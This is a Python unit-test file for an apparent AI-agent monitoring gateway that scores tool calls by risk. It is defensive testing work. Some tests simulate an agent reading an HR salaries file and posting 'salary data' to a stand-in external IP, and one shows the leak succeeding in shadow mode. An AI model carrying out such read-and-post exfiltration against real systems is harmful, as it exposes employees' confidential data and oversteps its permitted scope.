import unittest
from app.gateway.interceptor import MissingContract, UnknownAgent
from app.models.events import ToolCallRequest
from app.risk.engine import band_for
from app.risk.impact import impact_factor
from helpers import make_isolated, make_services


class RiskMathTests(unittest.TestCase):
    def test_bands(self):
        cases = [(0, "LOW"), (29.9, "LOW"), (30, "WATCH"), (59, "WATCH"), (60, "ELEVATED"),
                 (79, "ELEVATED"), (80, "HIGH"), (94, "HIGH"), (95, "CRITICAL"), (100, "CRITICAL")]
        for risk, band in cases:
            self.assertEqual(band_for(risk)[0], band, risk)

    def test_impact_factor(self):
        self.assertAlmostEqual(impact_factor(0.9, "internal", False), 0.45)
        self.assertAlmostEqual(impact_factor(0.0, "unknown", True), 0.5)
        self.assertEqual(impact_factor(1.0, "unknown", True), 1.0)


class GatewayTests(unittest.TestCase):
    def setUp(self):
        self.s = make_isolated()      # plumbing tests assert exact Phase 3 numbers
        self.gw = self.s.gateway
        self.gw.register_agent("proc-01", "procurement_agent", "priya")

    def call(self, tool, args=None, agent="proc-01"):
        return self.gw.handle_tool_call(ToolCallRequest(agent, tool, args or {}))

    def test_normal_call_is_low_and_returns_tool_result(self):
        d = self.call("supplier_api.get_price", {"sku": "SKU-100"})
        self.assertEqual((d.decision, d.band, d.risk), ("ALLOW", "LOW", 0.0))
        self.assertIsNone(d.alert_id)
        self.assertEqual(d.result["data"]["price"], 12.5)

    def test_risky_call_creates_alert_and_event(self):
        d = self.call("hr_files.read", {"path": "hr/salaries_2026.xlsx"})
        self.assertEqual(d.band, "WATCH")
        self.assertEqual(d.shadow_action, "WATCH")
        self.assertTrue(d.alert_id.startswith("alr_"))
        alerts = self.s.repo.list_alerts()
        self.assertEqual(len(alerts), 1)
        self.assertIn("denied", alerts[0]["reasons"][0])
        ev = self.s.repo.list_events()[0]
        self.assertEqual(ev["tool"], "hr_files.read")
        self.assertEqual(ev["lens"]["role"]["score"], 1.0)

    def test_shadow_mode_does_not_block_so_data_leaks(self):
        # This documents WHY Phase 6 exists: in shadow mode Warden only observes.
        self.call("http.post", {"url": "http://203.0.113.9/x", "body": "salary data"})
        self.assertEqual(len(self.s.backend.outbox), 1)

    def test_unknown_agent_rejected(self):
        with self.assertRaises(UnknownAgent):
            self.call("supplier_api.get_price", {"sku": "SKU-100"}, agent="ghost")

    def test_unknown_role_rejected(self):
        with self.assertRaises(MissingContract):
            self.gw.register_agent("x", "wizard_agent")

    def test_unknown_tool_scored_not_crashed(self):
        d = self.call("magic.do_anything")
        self.assertGreaterEqual(d.lens["role"]["score"], 0.6)
        self.assertFalse(d.result["ok"])

    def test_agent_listing_has_live_stats(self):
        self.call("supplier_api.get_price", {"sku": "SKU-100"})
        self.call("hr_files.read", {"path": "hr/salaries_2026.xlsx"})
        a = self.s.repo.list_agents()[0]
        # get_price returns untrusted data, so the HR read right after is tainted:
        # 58.0 (role alone) rises to 66.3 once provenance joins in.
        self.assertEqual((a["event_count"], a["last_risk"]), (2, 66.3))
        self.assertEqual(a["max_risk"], 66.3)

    def test_full_pipeline_never_scores_lower_than_isolated_lenses(self):
        """More lenses can only add evidence (noisy-OR is monotonic)."""
        full, iso = make_services(), make_isolated()
        for s in (full, iso):
            s.gateway.register_agent("a", "procurement_agent")
        for tool, args in [("supplier_api.get_price", {"sku": "SKU-100"}),
                           ("hr_files.read", {"path": "hr/salaries_2026.xlsx"}),
                           ("http.post", {"url": "http://203.0.113.9/x", "body": "z"})]:
            r = ToolCallRequest("a", tool, args)
            self.assertGreaterEqual(full.gateway.handle_tool_call(r).risk, iso.gateway.handle_tool_call(r).risk)

    def test_event_ids_increment(self):
        a = self.call("supplier_api.get_price", {"sku": "SKU-100"}).event_id
        b = self.call("supplier_api.get_price", {"sku": "SKU-200"}).event_id
        self.assertEqual((a, b), ("evt_000001", "evt_000002"))


if __name__ == "__main__":
    unittest.main()
